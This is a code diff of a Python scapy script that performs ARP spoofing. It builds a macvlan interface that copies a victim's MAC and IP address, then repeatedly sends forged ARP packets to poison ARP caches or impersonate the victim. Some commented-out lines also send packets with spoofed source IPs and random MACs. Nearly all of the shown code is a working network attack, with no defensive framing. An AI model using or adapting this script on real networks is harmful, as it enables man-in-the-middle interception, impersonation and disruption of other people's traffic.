@@ -3,11 +3,15 @@ from scapy.all import *
 import time
 from os import popen
 from random import randrange
+import signal
+
 def getmac(targetip):
   arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
   targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
   return targetmac
-
+def getmacSpoof(victimIP,victimMAC):
+  arppacket= Ether(src=victimMAC,dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst='10.12.21.1',psrc=victimIP)  
+  sendp(arppacket, verbose= False)
 def spoofarpcache(targetip, targetmac, sourceip, sourcemac):
   spoofed=  Ether(src=sourcemac)/ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac , hwsrc=sourcemac)
  
@@ -24,17 +28,31 @@ def restorearp(targetip, targetmac, sourceip, sourcemac):
   send(packet, verbose=False)
   print "ARP Table restored to normal for", targetip
 
-def main():
-  # targetip= raw_input("Enter Target IP:")
-  targetip="10.0.0.3"
-  victimip="10.0.0.1"
-  try:
-    targetmac= getmac(targetip)
-    print "Target MAC", targetmac
-  except:
-    print "Target machine did not respond to ARP broadcast"
-    quit()
+def exit_gracefully(self,signum, frame):
+    raise KeyboardInterrupt()
 
+def main():
+  # signal.signal(signal.SIGINT, exit_gracefully)
+  # targetip= raw_input("Enter Target IP:")
+  # targetip="10.0.0.4"
+  victimip="10.0.0.1"
+  # try:
+  #   targetmac= getmac(targetip)
+  #   print "Target MAC", targetmac
+  # except:
+  #   print "Target machine did not respond to ARP broadcast"
+  #   quit()
+
+  interface = popen('ifconfig | awk \'/eth0:/ {print $1}\'').read().rstrip()[:-1]
+  vinterface=interface+'.0'
+  try:
+    print "Turnoff virtual interface"
+    popen('ifconfig '+vinterface+' down')
+    popen('ip link del link '+interface+' '+vinterface)
+    print "Clear config", vinterface
+  except:
+    print "victim machine did not respond to ARP broadcast"
+    quit()
   try:
     victimmac= getmac(victimip)
     print "victim MAC", victimmac
@@ -43,8 +61,6 @@ def main():
     quit()
  
  
-  interface = popen('ifconfig | awk \'/eth0:/ {print $1}\'').read().rstrip()[:-1]
-  vinterface=interface+'.0'
   popen('ip link add link '+interface+' address '+victimmac+' '+vinterface+' type macvlan mode bridge')
   # print 'ip link add link '+interface+' address '+victimmac+' '+vinterface+' type macvlan mode bridge'
   popen('ifconfig '+vinterface+' '+victimip+' netmask 255.255.255.0 up')
@@ -54,13 +70,17 @@ def main():
       # spoofed = Ether()/IP(dst='10.0.0.2',src=sourceIPgen())/UDP(dport=1,sport=80)
       # packets = Ether(src=RandMAC())/IP(dst='10.0.0.2',src=sourceIPgen())/UDP(dport=1,sport=80)
       # sendp(packets,iface=interface.rstrip(), verbose= False,inter=1)
-      spoofarpcache(targetip, targetmac, victimip,victimmac)
+
+      # spoofarpcache(targetip, targetmac, victimip,victimmac)
+      getmacSpoof(victimip,victimmac)
+
       time.sleep(1)
       # spoofarpcache(gatewayip, gatewaymac, targetip)
   except KeyboardInterrupt:
     print "ARP spoofing stopped"
     print "Turnoff virtual interface"
     popen('ifconfig '+vinterface+' down')
+    popen('ip link del link '+interface+' '+vinterface)
     # restorearp(gatewayip, gatewaymac, targetip, targetmac)
     # restorearp(targetip, targetmac, gatewayip, gatewaymac)
     quit()
